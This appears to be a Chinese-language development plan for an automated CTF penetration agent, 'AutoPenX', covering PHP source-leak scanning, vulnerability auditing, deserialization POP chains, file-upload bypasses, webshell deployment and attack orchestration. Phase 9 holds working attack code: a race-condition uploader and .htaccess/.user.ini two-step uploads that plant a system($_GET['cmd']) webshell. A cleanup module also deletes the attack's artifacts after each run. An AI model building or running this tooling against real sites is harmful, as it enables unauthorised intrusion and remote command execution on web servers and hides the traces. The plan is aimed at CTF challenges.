# PHP 攻击链全栈增强计划

> **目标**: 为 AutoPenX CTF Agent 构建完整的 PHP Web 攻击链能力
> **范围**: 源码泄露发现 -> PHP 审计 -> 反序列化利用 -> 文件上传绕过 -> Webshell 交互 -> 自动化编排
> **原则**: 通用化(不限于 Laminas), 模块化(每个模块可独立使用), 可组合(编排层串联)

---

## Phase 1: 源码泄露自动发现与下载

### 1.1 新建: `autopnex/ctf/source_leak_scanner.py`

**备份文件探测** - 覆盖主流泄露路径:
- /www.zip /www.tar.gz /www.rar /web.zip /src.zip /source.zip
- /backup.zip /backup.tar.gz /site.zip /html.zip /app.zip
- /code.zip /dist.zip /website.zip /public.zip
- /{domain}.zip /{domain}.tar.gz /{domain}.rar

**Git 泄露检测与恢复**:
- 探测 /.git/HEAD, /.git/config
- 逐步下载 objects/, refs/, COMMIT_EDITMSG
- 使用 git fsck + git checkout 恢复源码(如果本地 git 可用)
- 或解析 objects/ pack 文件手动提取 blob

**SVN 泄露检测**: /.svn/entries, /.svn/wc.db (SQLite 解析)

**其他泄露源**: /.DS_Store, /composer.json, /package.json, /.env, /WEB-INF/web.xml

### 1.2 框架指纹识别

| 框架 | 指纹 |
|---|---|
| Laravel | artisan, app/Http/Kernel.php, composer.json 含 laravel/framework |
| ThinkPHP | think, thinkphp/, application/, config/app.php 含 think |
| Yii | yii, config/web.php, composer.json 含 yiisoft/yii2 |
| Laminas | laminas/, module/, config/autoload/, composer.json 含 laminas/ |
| Symfony | symfony/, bin/console, composer.json 含 symfony/ |
| CodeIgniter | system/, application/controllers/ |
| WordPress | wp-content/, wp-config.php |
| Raw PHP | 无框架特征 |

### 1.3 接口
- LeakResult 数据类: leak_type, url, local_path, files, framework, analysis
- SourceLeakScanner: scan_all(), probe_backup_files(), probe_git_leak(), detect_framework()
- 与 source_analyzer.py 的 analyze_attachment() 直接对接

---

## Phase 2: PHP 源码审计引擎

### 2.1 新建: `autopnex/ctf/php_audit_engine.py`

**危险函数模式库** (扩展 source_analyzer.py 的模式):

| 漏洞类型 | 危险模式 | 利用建议 |
|---|---|---|
| 反序列化 RCE | unserialize($controllable) | 构造 POP 链 |
| 文件包含 RCE | include/require($controllable) | LFI / php://filter / data:// / phar:// |
| 命令注入 | system/exec/passthru($controllable) | 管道符/反引号注入 |
| 代码执行 | eval/assert/preg_replace(e) | PHP 代码注入 |
| 任意文件读 | file_get_contents/readfile($controllable) | php://filter 读源码 |
| 任意文件写 | file_put_contents/fwrite($controllable) | 写入 webshell |
| 任意文件删 | unlink($controllable) | 配合 phar:// 反序列化 |
| 文件上传 | move_uploaded_file + 弱校验 | 扩展名/MIME 绕过 |
| SSRF | file_get_contents/curl_exec(URL) | 内网探测 file:// |
| SQL 注入 | 原始拼接 GET/POST 入 SQL | UNION/盲注/报错注入 |
| 变量覆盖 | extract($_GET/POST/REQUEST) | 覆盖关键变量 |
| 弱比较 | == / != / in_array(,,false) | 类型 juggling |
| Phar 触发 | file_exists/is_file/getimagesize(phar://) | Phar 反序列化 |

**数据流追踪** (轻量级): 识别 $_GET/$_POST 到危险函数的直接/间接传递

### 2.2 输出
- PHPVulnerability 数据类: vuln_type, severity, file, line, source, sink, exploit_hint, chain_potential
- PHPAuditEngine: audit(source_analysis) -> List[PHPVulnerability]

---

## Phase 3: PHP 反序列化利用框架

### 3.1 新建: `autopnex/ctf/php_deser_framework.py` + `autopnex/ctf/pop_chains/`

### 3.2 POP 链模板库

**ThinkPHP**:
- tp5_rce_windows (5.0.x): __destruct -> think\process\pipes\Windows -> system()
- tp5_rce_output (5.1.x): __destruct -> think\model\concern\Conversion -> call_user_func()
- tp6_rce (6.0.x): __destruct -> think\Model -> system()

**Laravel**:
- laravel_rce_pendingbroadcast (5.4-5.8): __destruct -> PendingBroadcast -> Dispatcher -> call_user_func()
- laravel_rce_mockobject (8.x-10.x): __destruct -> MockObject -> eval()

**Yii**:
- yii2_rce_batchquery (2.0.x): __destruct -> BatchQueryResult -> call_user_func()
- yii2_rce_swagger (2.0.38-): __toString -> Faker\Generator -> proc_open()

**Laminas/Zend**:
- laminas_pdo_fetch_class: __destruct -> PDO_connect (FETCH_CLASS) -> __set() file read
- zend_log_writer (2.x): __destruct -> Zend\Log\Writer\Mail -> eval()

**Symfony**:
- symfony_rce_process (3.x-5.x): __destruct -> Process -> proc_open()

**通用/CTF**:
- generic_tostring_to_call, generic_destruct_to_get, newstar_php_pop

### 3.3 接口
- POPChain 数据类: name, framework, gadget_classes, entry_point, sink, command_param
- POPChain.generate_serialize(command) -> bytes
- POPChain.generate_phar(command) -> bytes
- POPChainSelector: select(framework, available_classes) -> List[POPChain]
- PayloadGenerator: serialize_payload(), phar_payload(), phar_as_image(), gzip_payload()

---

## Phase 4: 文件上传利用模块

### 4.1 新建: `autopnex/ctf/upload_exploit.py`

### 4.2 绕过策略清单 (17 种)

| # | 策略 | 文件名 | Content-Type | 适用场景 |
|---|---|---|---|---|
| 1 | basic_php | shell.php | application/octet-stream | 无过滤 |
| 2 | double_ext | shell.php.jpg / shell.jpg.php | image/jpeg | 仅检查首/尾扩展名 |
| 3 | phtml | shell.phtml | application/octet-stream | 黑名单不含 phtml |
| 4 | php3456 | shell.php5 / .php7 / .pht | application/octet-stream | 黑名单不全 |
| 5 | case_bypass | shell.PhP / shell.pHP | image/png | 大小写敏感黑名单 |
| 6 | null_byte | shell.php%00.jpg | image/jpeg | PHP < 5.3.4 |
| 7 | mime_spoof | shell.php | image/png | 仅检查 Content-Type |
| 8 | gif_header | shell.gif | image/gif | getimagesize() 检查 |
| 9 | png_header | shell.png | image/png | exif_imagetype 检查 |
| 10 | htaccess | .htaccess | text/plain | 可上传 .htaccess |
| 11 | user_ini | .user.ini | text/plain | PHP-FPM .user.ini |
| 12 | short_tag | shell.php | - | short_open_tag 场景 |
| 13 | race_condition | shell.php | - | 上传后瞬间访问(条件竞争) |
| 14 | gzip_rename | shell.php.gz | application/gzip | 目标会解压 gz 文件 |
| 15 | phar_as_image | avatar.gif | image/gif | phar 反序列化触发 |
| 16 | svg_xxe | evil.svg | image/svg+xml | SVG 解析触发 XXE |
| 17 | polyglot_jpg | shell.jpg | image/jpeg | 严格图片校验 |

### 4.3 接口
- UploadExploit: find_upload_forms(), try_all_bypasses(), guess_uploaded_path(), verify_shell()
- 复用 web_session.py FormExtractor 发现 multipart 表单
- 上传后路径猜测: /uploads/{filename}, /upload/{md5}.{ext}, /tmp/{filename} 等

---

## Phase 5: Webshell 部署与交互

### 5.1 新建: `autopnex/ctf/webshell_manager.py`

### 5.2 Webshell 模板: classic, post_cmd, eval, base64, assert, preg, short_tag, minimal, callback, stealthy, disable_bypass

### 5.3 接口
- WebshellManager: deploy_via_upload(), deploy_via_write(), verify(), execute(), read_flag()
- 支持 GET/POST 两种命令传递方式
- 自动尝试多个 flag 路径: /flag, /flag.txt, /root/flag, /home/ctf/flag, env 变量

---

## Phase 6: 攻击链编排引擎

### 6.1 新建: `autopnex/ctf/attack_chain_orchestrator.py`

### 6.2 攻击链状态机

```
[START] -> [SOURCE_LEAK_SCAN]
  |              |
  | 无泄露       | 发现源码
  v              v
[RECON_FALLBACK]  [PHP_AUDIT] -> [VULN_CLASSIFY]
                       |
         +-------------+-------------+
         v             v             v
   [DESER_EXPLOIT] [UPLOAD_EXPLOIT] [DIRECT_EXPLOIT]
         |             |             |
         v             v             v
   [GENERATE_PAYLOAD] [UPLOAD_SHELL] [INJECT_CMD]
         |             |             |
         v             v             v
   [TRIGGER_DESER] [VERIFY_SHELL] [READ_FLAG]
         |             |
         v             v
   [READ_FLAG]   [EXEC_COMMAND] -> [READ_FLAG] -> [SUCCESS]
```

### 6.3 接口
- AttackChainOrchestrator: run() -> AttackChainResult
- AttackChainResult: success, flag, chain_steps, duration, source_leak, vulnerabilities, exploit_used, webshell_url

### 6.4 与 Helper Dispatcher 集成
- 新增 try_source_leak_chain_from_tool_result() 高优先级 helper
- DirEnum 发现 200 状态的 .zip/.git/HEAD 时自动触发完整攻击链

---

## Phase 7: 测试计划

| 测试文件 | 覆盖模块 |
|---|---|
| tests/ctf/test_source_leak_scanner.py | 备份文件探测、Git/SVN 泄露、框架指纹 |
| tests/ctf/test_php_audit_engine.py | 危险模式匹配、数据流追踪、漏洞分类 |
| tests/ctf/test_php_deser_framework.py | POP 链选择、序列化生成、Phar 构建 |
| tests/ctf/test_upload_exploit.py | 各绕过策略、路径猜测、shell 验证 |
| tests/ctf/test_webshell_manager.py | 部署、执行、flag 读取 |
| tests/ctf/test_attack_chain.py | 端到端编排测试 (mock HTTP) |

---

## 实施顺序

Phase 1-5 可并行开发, Phase 6 依赖所有前置模块。

### 文件变更清单

**新建文件 (~19 个)**:
1. autopnex/ctf/source_leak_scanner.py (~400 行)
2. autopnex/ctf/php_audit_engine.py (~500 行)
3. autopnex/ctf/php_deser_framework.py (~300 行)
4. autopnex/ctf/pop_chains/__init__.py
5. autopnex/ctf/pop_chains/thinkphp.py (~200 行)
6. autopnex/ctf/pop_chains/laravel.py (~150 行)
7. autopnex/ctf/pop_chains/yii.py (~150 行)
8. autopnex/ctf/pop_chains/laminas.py (~100 行)
9. autopnex/ctf/pop_chains/symfony.py (~100 行)
10. autopnex/ctf/pop_chains/generic.py (~150 行)
11. autopnex/ctf/upload_exploit.py (~400 行)
12. autopnex/ctf/webshell_manager.py (~300 行)
13. autopnex/ctf/attack_chain_orchestrator.py (~500 行)
14-19. tests/ctf/test_*.py (~1200 行合计)

**修改文件 (~5 个)**:
1. autopnex/ctf/helpers/web.py - 新增 try_source_leak_chain_from_tool_result()
2. autopnex/ctf/helpers/dispatcher.py - 注册新 helper
3. autopnex/ctf/helpers/__init__.py - 导出
4. autopnex/ctf/__init__.py - 导出新模块
5. autopnex/tools/ctf_web/__init__.py - 注册新工具

**预估总代码量: ~4100 行新增代码**

---

## Phase 8: 临时文件自动清理 (`workspace_cleaner.py`)

### 8.1 需求背景

攻击链执行过程中会产生大量临时文件:
- 下载的源码包 (www.zip, backup.tar.gz 等)
- 解压后的源码目录
- Git/SVN 泄露恢复的 objects 文件
- 生成的 Phar payload 文件
- 上传用的临时 webshell 文件
- 中间生成的 PHP 脚本 (如 phar_builder.php)
- 审计报告临时 JSON
- 解压产生的临时目录

**核心原则**: 任务完成(无论成功/失败) → 自动清理所有临时产物 → 只保留最终结果报告

### 8.2 新建: `autopnex/ctf/workspace_cleaner.py`

### 8.3 设计

```python
import shutil
import atexit
from pathlib import Path
from typing import List, Set
from contextlib import contextmanager

class WorkspaceCleaner:
    """Track and clean up temporary files/directories created during attack chain execution."""

    def __init__(self, base_dir: str = "ctf_workspace", auto_clean: bool = True):
        self._base_dir = Path(base_dir)
        self._tracked_files: Set[Path] = set()
        self._tracked_dirs: Set[Path] = set()
        self._auto_clean = auto_clean
        self._preserved_results: List[Path] = []  # 不会被清理的文件
        self._cleaned = False

        if auto_clean:
            atexit.register(self.cleanup)

    # ------------------------------------------------------------------
    # 追踪 API
    # ------------------------------------------------------------------

    def track_file(self, path: str | Path) -> Path:
        """注册一个临时文件用于后续清理"""
        p = Path(path).resolve()
        self._tracked_files.add(p)
        return p

    def track_dir(self, path: str | Path) -> Path:
        """注册一个临时目录用于后续清理(含所有子文件)"""
        p = Path(path).resolve()
        self._tracked_dirs.add(p)
        return p

    def preserve(self, path: str | Path):
        """标记某文件为"保留" — 清理时跳过"""
        self._preserved_results.append(Path(path).resolve())

    # ------------------------------------------------------------------
    # 清理 API
    # ------------------------------------------------------------------

    def cleanup(self, force: bool = False) -> dict:
        """执行清理, 删除所有追踪的临时文件和目录.

        Returns:
            dict with keys: files_deleted, dirs_deleted, errors, preserved
        """
        if self._cleaned and not force:
            return {"already_cleaned": True}

        stats = {"files_deleted": 0, "dirs_deleted": 0, "errors": [], "preserved": []}

        # 删除追踪的文件
        for f in self._tracked_files:
            if f in self._preserved_results:
                stats["preserved"].append(str(f))
                continue
            try:
                if f.exists():
                    f.unlink()
                    stats["files_deleted"] += 1
            except OSError as e:
                stats["errors"].append(f"{f}: {e}")

        # 删除追踪的目录 (从最深层开始)
        sorted_dirs = sorted(self._tracked_dirs, key=lambda p: len(p.parts), reverse=True)
        for d in sorted_dirs:
            if d in self._preserved_results:
                stats["preserved"].append(str(d))
                continue
            try:
                if d.exists():
                    shutil.rmtree(d, ignore_errors=True)
                    stats["dirs_deleted"] += 1
            except OSError as e:
                stats["errors"].append(f"{d}: {e}")

        # 清理 base_dir 如果为空
        try:
            if self._base_dir.exists() and not any(self._base_dir.iterdir()):
                self._base_dir.rmdir()
        except OSError:
            pass

        self._cleaned = True
        self._tracked_files.clear()
        self._tracked_dirs.clear()
        return stats

    def cleanup_on_success(self):
        """任务成功时的清理 — 删除所有临时文件"""
        return self.cleanup()

    def cleanup_on_failure(self):
        """任务失败时的清理 — 同样删除(避免磁盘堆积)"""
        return self.cleanup()

    # ------------------------------------------------------------------
    # Context Manager
    # ------------------------------------------------------------------

    @contextmanager
    def managed_workspace(self):
        """Context manager: 进入时创建工作目录, 退出时自动清理.

        Usage:
            with cleaner.managed_workspace():
                # ... 攻击链执行 ...
            # 自动清理所有临时文件
        """
        self._base_dir.mkdir(parents=True, exist_ok=True)
        self.track_dir(self._base_dir)
        try:
            yield self._base_dir
        finally:
            self.cleanup()

    # ------------------------------------------------------------------
    # 便捷方法
    # ------------------------------------------------------------------

    def create_temp_file(self, name: str, content: bytes) -> Path:
        """创建并追踪一个临时文件"""
        self._base_dir.mkdir(parents=True, exist_ok=True)
        p = self._base_dir / name
        p.write_bytes(content)
        self.track_file(p)
        return p

    def create_temp_dir(self, name: str) -> Path:
        """创建并追踪一个临时子目录"""
        self._base_dir.mkdir(parents=True, exist_ok=True)
        d = self._base_dir / name
        d.mkdir(parents=True, exist_ok=True)
        self.track_dir(d)
        return d

    @property
    def tracked_count(self) -> int:
        return len(self._tracked_files) + len(self._tracked_dirs)
```

### 8.4 需要清理的文件类型

| 来源模块 | 临时产物 | 清理时机 |
|---|---|---|
| `source_leak_scanner` | 下载的 .zip/.tar.gz/.rar, 解压目录, git objects | 任务结束 |
| `php_audit_engine` | 审计中间 JSON, 提取的 PHP 文件 | 任务结束 |
| `php_deser_framework` | 生成的 .phar 文件, phar_builder.php 脚本 | payload 上传后 |
| `upload_exploit` | 临时 webshell 文件, .htaccess, .user.ini | 上传后 |
| `webshell_manager` | 本地 shell 副本 | 任务结束 |
| `attack_chain_orchestrator` | workspace 总目录 | 链执行完毕 |

### 8.5 与 AttackChainOrchestrator 的集成

```python
class AttackChainOrchestrator:
    def __init__(self, ...):
        ...
        self._cleaner = WorkspaceCleaner(
            base_dir=work_dir,
            auto_clean=True,  # atexit 兜底
        )

    def run(self, target_url: str, ...) -> AttackChainResult:
        try:
            # ... 攻击链执行 ...
            result = self._execute_chain(target_url)
            
            # 保留最终报告
            if result.flag:
                report_path = self._save_report(result)
                self._cleaner.preserve(report_path)

            return result
        finally:
            # 无论成功/失败都清理
            cleanup_stats = self._cleaner.cleanup()
            log.info(f"Cleanup: {cleanup_stats['files_deleted']} files, "
                     f"{cleanup_stats['dirs_deleted']} dirs removed")
```

### 8.6 各模块追踪点注入

**source_leak_scanner.py**:
```python
def _save_leak(self, base, path, content, leak_type):
    ...
    dest = self._work_dir / "leaks" / filename
    dest.write_bytes(content)
    if self._cleaner:
        self._cleaner.track_file(dest)
    ...
```

**php_deser_framework.py**:
```python
def phar_payload(self, chain, command):
    phar_bytes = chain.generate_phar(command)
    tmp = self._cleaner.create_temp_file("payload.phar", phar_bytes)
    return phar_bytes  # 返回内存 bytes, 磁盘文件只是备份
```

**upload_exploit.py**:
```python
def try_bypass(self, ...):
    # 上传前创建本地副本(用于调试), 追踪清理
    local_copy = self._cleaner.create_temp_file(f"upload_{strategy.id}.php", content)
    ...
```

### 8.7 安全保障

1. **atexit 兜底** — 即使程序异常退出(非 SIGKILL), 也会触发清理
2. **preserve 白名单** — 最终报告/flag 记录不会被误删
3. **只清理追踪文件** — 不会误删非攻击链产生的文件
4. **从深到浅删目录** — 避免"目录非空"错误
5. **ignore_errors** — 单文件删除失败不阻塞整体清理
6. **context manager** — `with managed_workspace()` 保证退出即清理

---

## Phase 9: 已知改进项 (后续迭代)

### 9.1 POP 链序列化代码完善

**现状**: ThinkPHP tp5_rce_output/tp6_rce 和 Laravel laravel_rce_mockobject 等链的 `serialize_code` 返回占位符 `b'O:8:"ThinkPHP":0:{}'`

**改进**: 补充完整的真实序列化结构，需要:
- 从 phpggc 项目提取真实 gadget 链结构
- 用 Python 构造等效的序列化字节流(无需 PHP 运行时)
- 每条链需要处理 private/protected 属性的 null 字节前缀

**实现方案**:
```python
# pop_chains/thinkphp.py - tp5_rce_windows 完整实现
def _tp5_windows_serialize(cmd: str) -> bytes:
    """ThinkPHP 5.0 Windows POP chain 完整序列化."""
    # think\process\pipes\Windows::__destruct()
    #   -> $this->close()
    #   -> $this->removeFiles()
    #   -> array_map('file_get_contents', $this->files)
    # 实际上利用 __toString -> Output::__call -> call_user_func
    inner_class = "think\\model\\Pivot"
    # ... 构造嵌套对象
```

**优先级**: P1 (直接影响 CTF 实战 payload 可用性)

### 9.2 Git 泄露完整恢复

**现状**: 下载 git objects 到本地但无 `git checkout` 恢复步骤

**改进**:
```python
def _recover_git_source(self, leak_dir: Path) -> List[str]:
    """尝试从下载的 git objects 恢复完整源码."""
    # 方案 A: 调用本地 git (需要 git 在 PATH)
    result = subprocess.run(
        ["git", "checkout", "--", "."],
        cwd=str(leak_dir), capture_output=True, timeout=30
    )
    
    # 方案 B: 手动解析 git objects (纯 Python)
    # 1. 从 HEAD -> refs/heads/master 获取 commit SHA
    # 2. 解压 commit object 获取 tree SHA
    # 3. 递归解析 tree -> blob, 写出文件
    for sha, path in self._walk_git_tree(tree_sha):
        blob = self._read_git_object(sha)
        (leak_dir / path).write_bytes(blob)
```

**优先级**: P2

### 9.3 条件竞争上传

**现状**: `race_condition` 策略已定义但无并发实现

**改进**:
```python
import threading
from concurrent.futures import ThreadPoolExecutor

def _race_upload(self, upload_url: str, shell_url: str, content: bytes, threads: int = 20):
    """条件竞争: 并发上传 + 并发访问."""
    stop_event = threading.Event()
    success = {"url": ""}

    def uploader():
        while not stop_event.is_set():
            self._session.post(upload_url, files={"file": ("shell.php", content)})

    def accessor():
        while not stop_event.is_set():
            try:
                r = self._session.get(shell_url, timeout=2)
                if "AUTOPENX_OK" in r.text or self._flag_re.search(r.text):
                    success["url"] = shell_url
                    stop_event.set()
            except:
                pass

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = []
        for _ in range(threads // 2):
            futures.append(pool.submit(uploader))
            futures.append(pool.submit(accessor))
        stop_event.wait(timeout=30)
        stop_event.set()

    return success["url"] or None
```

**优先级**: P2

### 9.4 .htaccess / .user.ini 两步上传

**现状**: 策略定义中有但未实现分步逻辑

**改进**:
```python
def _htaccess_two_step(self, upload_url: str, field: str) -> Optional[str]:
    """Step 1: 上传 .htaccess 使 .txt 解析为 PHP; Step 2: 上传 shell.txt"""
    # Step 1
    htaccess = b"AddType application/x-httpd-php .txt\n"
    self._session.post(upload_url, files={field: (".htaccess", htaccess, "text/plain")})
    
    # Step 2
    shell = b'<?php system($_GET["cmd"]); ?>'
    r = self._session.post(upload_url, files={field: ("shell.txt", shell, "text/plain")})
    
    # 验证
    shell_url = self._guess_shell_path(r, "shell.txt")
    return shell_url if self._verify_shell(shell_url) else None

def _user_ini_two_step(self, upload_url: str, field: str) -> Optional[str]:
    """Step 1: 上传 .user.ini 配置 auto_prepend_file; Step 2: 上传 shell 文件"""
    # Step 1
    user_ini = b"auto_prepend_file=shell.jpg\n"
    self._session.post(upload_url, files={field: (".user.ini", user_ini, "text/plain")})
    
    # Step 2: 等待 PHP-FPM 重新加载 .user.ini (默认 300s, CTF 通常更短)
    time.sleep(2)
    shell = b'<?php system($_GET["cmd"]); ?>'
    r = self._session.post(upload_url, files={field: ("shell.jpg", shell, "image/jpeg")})
    
    # 访问同目录下任意 .php 文件即可触发
    index_url = upload_url.rsplit("/", 1)[0] + "/index.php?cmd=cat+/flag"
    return index_url
```

**优先级**: P1 (upload-labs 高频考点)

---

## 更新后文件清单

### 新增文件 (Phase 8)
- `autopnex/ctf/workspace_cleaner.py` (~150 行)
- `tests/ctf/test_workspace_cleaner.py` (~80 行)

### 修改文件 (Phase 8 集成)
- `autopnex/ctf/attack_chain_orchestrator.py` — 引入 WorkspaceCleaner, try/finally 清理
- `autopnex/ctf/source_leak_scanner.py` — 接受可选 cleaner 参数, 追踪下载文件
- `autopnex/ctf/php_deser_framework.py` — 追踪生成的 phar 临时文件
- `autopnex/ctf/upload_exploit.py` — 追踪上传用本地副本
- `autopnex/ctf/__init__.py` — 导出 WorkspaceCleaner

### 修改文件 (Phase 9 改进)
- `autopnex/ctf/pop_chains/thinkphp.py` — 完善真实序列化结构
- `autopnex/ctf/pop_chains/laravel.py` — 完善真实序列化结构
- `autopnex/ctf/source_leak_scanner.py` — git checkout / 纯 Python 恢复
- `autopnex/ctf/upload_exploit.py` — 条件竞争 + .htaccess/.user.ini 分步逻辑
